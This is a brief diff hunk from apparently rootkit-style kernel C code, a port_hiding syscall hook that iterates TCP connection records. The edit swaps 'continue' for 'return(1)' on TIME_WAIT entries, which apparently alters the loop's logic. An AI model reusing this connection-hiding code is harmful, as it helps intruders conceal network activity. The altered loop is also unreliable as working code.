@@ -33,7 +33,7 @@ port_hiding(struct thread *td, void *syscall_args)
 	/* Iterate through the TCP-based inpcb list. */
 	LIST_FOREACH(inpb, tcbinfo.ipi_listhead, inp_list) {
 		if (inpb->inp_vflag & INP_TIMEWAIT)
-			continue;
+			return(1);
 
 		INP_WLOCK(inpb);
 
